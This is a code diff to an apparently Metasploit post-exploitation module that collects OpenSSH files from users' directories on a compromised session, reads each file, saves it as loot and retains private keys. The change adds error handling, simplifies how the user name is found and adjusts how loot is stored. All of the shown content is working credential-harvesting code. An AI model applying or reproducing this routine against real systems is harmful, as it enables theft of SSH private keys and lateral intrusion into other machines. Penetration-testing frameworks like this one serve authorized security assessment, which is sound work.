@@ -69,17 +69,21 @@ class MetasploitModule < Msf::Post
         next
       end
 
-      if session.type == 'meterpreter'
-        sep = session.fs.file.separator
-        files = session.fs.dir.entries(path)
-      else
-        # Guess, but it's probably right
-        sep = '/'
-        files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
+      begin
+        if session.type == 'meterpreter'
+          sep = session.fs.file.separator
+          files = session.fs.dir.entries(path)
+        else
+          sep = '/'
+          files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
+        end
+      rescue StandardError => e
+        print_warning("Cannot access directory: #{path} - #{e.message}")
+        next
       end
-      path_array = path.split(sep)
-      path_array.pop
-      user = path_array.pop
+
+      user = File.basename(File.dirname(path))
+      vprint_status("User: #{user}")
       files.each do |file|
         next if ['.', '..'].include?(file)
 
@@ -90,11 +94,11 @@ class MetasploitModule < Msf::Post
           next
         end
 
-        data = read_file("#{path}#{sep}#{file}")
+        data = read_file(file_path)
         file = file.split(sep).last
 
-        loot_path = store_loot("ssh.#{file}", 'text/plain', session, data, "ssh_#{file}", "OpenSSH #{file} File")
-        print_good("Downloaded: #{path}#{sep}#{file} -> #{loot_path}")
+        loot_path = store_loot("ssh.#{file.tr('.', '_')}", 'text/plain', session, data, "ssh_#{file}", "OpenSSH #{file} File")
+        print_good("Downloaded: #{file_path} -> #{loot_path}")
 
         # store only ssh private keys
         next if SSHKey.valid_ssh_public_key? data
